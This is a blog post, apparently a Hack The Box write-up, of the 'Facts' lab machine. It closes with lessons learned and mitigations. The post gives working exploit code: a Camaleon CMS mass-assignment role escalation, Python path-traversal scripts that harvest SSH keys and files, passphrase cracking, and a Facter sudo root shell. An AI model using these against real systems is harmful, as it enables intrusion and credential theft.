---
title: "HTB Walkthrough: Facts"
date: 2026-06-09
draft: false
description: "Full walkthrough of the Facts machine from Hack The Box. Easy difficulty, Linux (Ubuntu 25.04). Mass Assignment in Camaleon CMS to escalate to admin, Path Traversal to extract an SSH private key, passphrase cracking with John, and root escalation via Facter NOPASSWD sudo."
tags: ["HackTheBox", "Linux", "Easy", "MassAssignment", "PathTraversal", "CVE-2025-2304", "CVE-2026-1776", "CamaleonCMS", "SSH", "JohnTheRipper", "Facter", "Sudo", "PrivEsc", "facts", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Facts** on Hack The Box. **Easy** difficulty machine running **Linux (Ubuntu 25.04)**. We exploit a Mass Assignment in Camaleon CMS to escalate our role to administrator without knowing any password, abuse a Path Traversal in the AWS uploader to read system files and extract an encrypted SSH key, crack the passphrase with John the Ripper, and escalate to root by abusing `sudo NOPASSWD` permissions over `facter` with a malicious custom Ruby fact.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                |
|----------------|-------------------------------------------------------------------------------------------------------|
| **Name**       | Facts                                                                                                 |
| **OS**         | Linux (Ubuntu 25.04 — GNU/Linux 6.14.0)                                                               |
| **Difficulty** | Easy                                                                                                  |
| **IP**         | 10.129.20.171                                                                                         |
| **Techniques** | Mass Assignment · Path Traversal · SSH Key Cracking · Facter sudo NOPASSWD RCE                       |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.20.171
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown
```

Version scan on open ports:

```bash
nmap -sC -sV -p22,80,54321 10.129.20.171
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp    open  http     nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http     Golang net/http server
|_http-server-header: MinIO
|_http-title: Did not follow redirect to http://10.129.20.171:9001
```

*Open ports:*
- `22` → OpenSSH 9.9p1 (available for later access)
- `80` → nginx with virtual host `facts.htb` — needs to be added to `/etc/hosts`
- `54321` → **MinIO** (S3-compatible object storage) redirecting to admin console on port 9001, not exposed externally

> **💡 Key detail:** Port 54321 runs MinIO, an object storage service. The admin console (9001) isn't externally accessible, but the existence of an S3-compatible service may be relevant for the web application's uploaders.

```bash
echo "10.129.20.171 facts.htb" >> /etc/hosts
```

### 1.2 Web Enumeration — Camaleon CMS

Directory fuzzing on `http://facts.htb/`:

```bash
ffuf -u http://facts.htb/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -ic -c
```

```
[Status: 302] admin     → redirects to login
[Status: 200] index
[Status: 200] search
[Status: 200] page
[Status: 200] post
```

We find an admin panel at `/admin`. We register a normal user account to explore the application and identify **Camaleon CMS version 2.9**.

With our newly created account we only have access to edit our own profile. The panel shows:
- **#ID:** 5
- **Login:** test
- **Role:** Client

![User profile showing Role: Client](/img/fact1.png)

> **💡 Attack surface:** We have a user account with the `Client` role and access to the password change endpoint. In Rails, password change forms typically pass data directly to the `User` model. If the backend doesn't explicitly filter which fields the user can modify, it could be vulnerable to Mass Assignment.

---

## 2. Exploitation — CVE-2025-2304 (Mass Assignment: Role Escalation)

### 2.1 Vulnerability Analysis

Camaleon CMS 2.9 doesn't properly filter the parameters a user can send when updating their profile. When sending a `POST` request to the password change endpoint, the backend accepts **any field of the `User` model**, including `role`. This is known as **Mass Assignment** — the attacker can modify fields that should be read-only.

```
Normal flow:    user sends password + password_confirmation → only the password is updated
Malicious flow: user adds &password[role]=admin → the backend also updates the role field
```

### 2.2 Step-by-Step Exploitation

**Step 1 — Configure Burp Suite as proxy and intercept the password change:**

In Firefox: Settings → General → Network settings → Manual proxy configuration:
- HTTP Proxy: `127.0.0.1`, Port `8080`

![Firefox proxy configuration](/img/fact2.png)

In the user profile, click **"Change Password"** with Intercept active in Burp Suite.

![Change Password button in the profile](/img/fact3.png)

**Step 2 — Modify the intercepted POST request:**

The original request has this body:

```
authenticity_token=...&password=test1234&password_confirmation=test1234
```

We add `&password[role]=admin` before forwarding:

```
authenticity_token=...&password=test1234&password_confirmation=test1234&password[role]=admin
```

![Intercepted request in Burp Suite with the role parameter injected](/img/fact4.png)

**Step 3 — Verify the escalation:**

After forwarding the request and reloading the profile, the Role field now shows **"Administrator"**.

![Profile showing Role: Administrator after Mass Assignment](/img/fact5.png)

> **🔑 We are CMS administrators without knowing any admin password.**

✅ **Role escalated to Administrator via Mass Assignment (CVE-2025-2304).**

---

## 3. Exploitation — CVE-2026-1776 (Camaleon CMS Path Traversal via AWS Uploader)

### 3.1 Vulnerability Analysis

The `/admin/media/download_private_file` endpoint in Camaleon CMS's AWS uploader plugin doesn't validate the path of the `file` parameter with the `valid_folder_path?` function, unlike the local uploader which does. This allows an authenticated admin to read **any file on the system** via path traversal (`../../`).

```
Normal flow:    GET /admin/media/download_private_file?file=uploads/image.png → serves the file
Malicious flow: GET /admin/media/download_private_file?file=../../etc/passwd  → reads the filesystem
```

### 3.2 Phase 1 — Confirmation and Reading `/etc/passwd`

We use a Python script with the admin session cookie obtained from the browser:

```python
#!/usr/bin/env python3
"""
CVE-2026-1776 - Camaleon CMS Path Traversal via AWS Uploader
Affects: versions 2.4.5.0 - 2.9.0 (before commit f54a77e)
"""

import requests
from urllib.parse import urljoin

TARGET_URL  = "http://facts.htb/"
ENDPOINT    = "/admin/media/download_private_file"
SESSION_VAR = "_factsap_session"
SESSION_VAL = "lNF74a7lw4..."   # Admin session cookie from browser
AUTH_TOKEN  = "1QGOA6YxgFANPE6XlGYPpg..."

HEADERS = {
    "Cookie": f"{SESSION_VAR}={SESSION_VAL}; auth_token={AUTH_TOKEN}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0)",
    "X-Requested-With": "XMLHttpRequest",
}

TARGET_FILES = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../config/database.yml",
    "../../../../../../../../../../app/.env",
]

for payload in TARGET_FILES:
    r = requests.get(
        urljoin(TARGET_URL, ENDPOINT),
        headers=HEADERS,
        params={"file": payload},
        allow_redirects=False,
        timeout=8,
    )
    if r.status_code == 200 and r.text.strip():
        filename = payload.split("/")[-1]
        print(f"\n[+] {filename} ({len(r.text)} bytes):\n{r.text[:500]}")
```

**Result:**

```
[+] passwd (1809 bytes):
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

> **💡 Shell users identified:**
> - `trivia` (uid=1000) — web application user
> - `william` (uid=1001) — secondary user

### 3.3 Phase 2 — Targeted Credential Extraction

With users identified, we run a second script focused on SSH keys, shell history, and flags:

```python
#!/usr/bin/env python3
"""CVE-2026-1776 - Phase 2: Targeted credential extraction"""

import requests
from urllib.parse import urljoin

TARGET_URL = "http://facts.htb/"
ENDPOINT   = "/admin/media/download_private_file"
HEADERS    = { ... }  # Same headers as Phase 1

DEPTH = "../../../../../../../../../../"

TARGETS = {
    "SSH": [
        ("trivia_id_ed25519",  f"{DEPTH}home/trivia/.ssh/id_ed25519"),
        ("trivia_authorized",  f"{DEPTH}home/trivia/.ssh/authorized_keys"),
        ("william_id_ed25519", f"{DEPTH}home/william/.ssh/id_ed25519"),
        ("root_id_rsa",        f"{DEPTH}root/.ssh/id_rsa"),
    ],
    "HISTORY": [
        ("trivia_bash_history",  f"{DEPTH}home/trivia/.bash_history"),
        ("william_bash_history", f"{DEPTH}home/william/.bash_history"),
    ],
    "FLAGS": [
        ("user_flag_william", f"{DEPTH}home/william/user.txt"),
        ("user_flag_trivia",  f"{DEPTH}home/trivia/user.txt"),
        ("root_flag",         f"{DEPTH}root/root.txt"),
    ],
}

def fetch(payload):
    r = requests.get(
        urljoin(TARGET_URL, ENDPOINT),
        headers=HEADERS,
        params={"file": payload},
        allow_redirects=False,
        timeout=8,
    )
    if r.status_code == 200 and r.text.strip():
        return True, r.text
    return False, f"HTTP {r.status_code}"

for category, items in TARGETS.items():
    print(f"\n=== {category} ===")
    for name, payload in items:
        ok, content = fetch(payload)
        if ok:
            print(f"[+] {name} ({len(content)} bytes)")
            with open(f"loot_{name}.txt", "w") as f:
                f.write(content)
        else:
            print(f"[-] {name} -> {content}")
```

**Files recovered:**

```
loot_trivia_id_ed25519.txt   ← Encrypted SSH private key of trivia
loot_trivia_authorized.txt   ← Authorized public key of trivia
loot_user_flag_william.txt   ← User flag (william)
```

---

## 4. User Flag

William's user flag is obtained directly via Path Traversal, without needing SSH authentication:

```bash
cat loot_user_flag_william.txt
```

> 🔑 User flag obtained.

---

## 5. SSH Key Cracking — Access as `trivia`

Trivia's private key is encrypted with a passphrase (bcrypt/AES algorithm, 24 iterations). We crack it with John the Ripper:

```bash
# Convert the key to the hash format John understands
ssh2john loot_trivia_id_ed25519.txt > hash.hash

# Attack with the rockyou dictionary
john hash.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
dragonballz      (loot_trivia_id_ed25519.txt)

1g 0:00:04:17 DONE — Session completed.
```

> **🔑 Passphrase found:** `dragonballz`

```bash
chmod 600 loot_trivia_id_ed25519.txt
ssh -i loot_trivia_id_ed25519.txt trivia@10.129.20.171
# Passphrase: dragonballz
```

```
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
trivia@facts:~$
```

✅ **Shell obtained as `trivia`.**

---

## 6. Privilege Escalation — Facter NOPASSWD sudo

### 6.1 Sudo Permission Enumeration

```bash
trivia@facts:~$ sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### 6.2 Escalation Vector Analysis

`facter` is a tool in the Puppet ecosystem that collects system information ("facts") by executing Ruby code. It supports **custom facts** — external Ruby scripts that the user can provide with the `--custom-dir` flag. When `facter` runs as root via sudo, any Ruby code in those scripts executes with root privileges.

```
Normal flow:    sudo facter → collects system information and prints it
Malicious flow: sudo facter --custom-dir /tmp/pwn → executes our malicious Ruby as root
```

> **💡 Difference from SUID:** A binary with SUID always executes with the file owner's UID. Here the risk comes from the tool's design: `facter` is designed to execute arbitrary Ruby code as part of its custom facts functionality. It's a legitimate attack surface that becomes critical when combined with unrestricted sudo arguments.

### 6.3 Exploitation

**Step 1 — Create the directory and the malicious custom fact:**

```bash
trivia@facts:/tmp$ mkdir -p /tmp/pwn

trivia@facts:/tmp$ cat > /tmp/pwn/root.rb << 'EOF'
Facter.add('rootshell') do
  setcode do
    system('/bin/bash -p')
    'done'
  end
end
EOF
```

When `facter` loads the custom fact, it executes the `setcode` block as part of the evaluation. Running with `sudo`, that block executes with EUID=0, spawning a root shell.

**Step 2 — Execute facter pointing to the malicious directory:**

```bash
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir /tmp/pwn rootshell
```

```
root@facts:/tmp#
```

✅ **Root shell obtained via malicious Ruby custom fact in Facter with sudo NOPASSWD.**

---

## 7. Root Flag

```bash
root@facts:/tmp# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 8. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Port 80 with Camaleon CMS 2.9 (`facts.htb`); Port 54321 with MinIO.
2. **Mass Assignment (CVE-2025-2304)** → Register as normal user + Burp Suite → `&password[role]=admin` → role escalated to Administrator without a password.
3. **Path Traversal (CVE-2026-1776)** → AWS uploader doesn't validate paths → LFI on `/admin/media/download_private_file` → `/etc/passwd` (users) + `id_ed25519` of trivia + william's flag → `user.txt`.
4. **SSH Key Cracking** → `ssh2john` + `john` + `rockyou.txt` → passphrase `dragonballz` → shell as `trivia`.
5. **PrivEsc** → `sudo -l` reveals `facter` NOPASSWD → Ruby custom fact with `system('/bin/bash -p')` → root shell → `root.txt`.

**What I learned from this machine:**

- **Mass Assignment is invisible without an active source code review.** There's no external signal that the endpoint is vulnerable — everything looks like a normal password change form. The defense is using `strong_parameters` in Rails to explicitly list allowed fields (`permit(:password, :password_confirmation)`) and nothing more. The problem is that modern frameworks make it very easy to forget this with a careless `update(params[:user])`.

- **Path traversal in an uploader is especially dangerous because the endpoint legitimately accesses the filesystem.** The discrepancy between the local uploader (which does validate with `valid_folder_path?`) and the AWS uploader (which doesn't) shows how a feature can be patched in one place but not another. When auditing path traversal, verify **all** endpoints that touch the filesystem, not just the obvious ones.

- **SSH key passphrases are a real security factor, but only if they're strong.** `dragonballz` is in `rockyou.txt` and cracked in 4 minutes. An SSH key without a passphrase is directly reusable by anyone who steals it; with a weak passphrase, the time gained is minimal. The defense is treating the passphrase like a critical password: long, random, and stored in a password manager.

- **`sudo NOPASSWD` over tools that execute external code is equivalent to giving direct root.** `facter --custom-dir` is a clear case: the tool is designed to execute arbitrary Ruby. Granting sudo without restricting arguments (there's no `--no-custom-dir` flag, so the only option is removing the sudoers entry) is equivalent to a root shell for any member of the group. The principle: before adding a NOPASSWD entry, verify the binary has no mechanism for arbitrary code execution.

- **Chaining vulnerabilities of different severity can result in full compromise.** None of the individual vulnerabilities alone would have been sufficient: Mass Assignment without admin access doesn't give a foothold; Path Traversal without admin is inaccessible; the SSH key without Path Traversal can't be obtained. The full chain shows why scoring isolated vulnerabilities can underestimate the real risk in a system.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| CVE-2025-2304 (Mass Assignment) | Use `strong_parameters` in Rails: `permit(:password, :password_confirmation)` — never accept `role` as a user-editable parameter |
| CVE-2026-1776 (Path Traversal) | Update Camaleon to a version after commit `f54a77e`; apply `valid_folder_path?` in **all** uploaders, not just the local one |
| SSH key with weak passphrase | Use long, random passphrases (20+ characters); consider hardware tokens (YubiKey) |
| `facter` with sudo NOPASSWD | Remove the sudoers entry; if it must be kept, run `facter` in a wrapper that disables custom facts (`--no-custom-dir` doesn't exist — the only safe option is removing the privilege) |
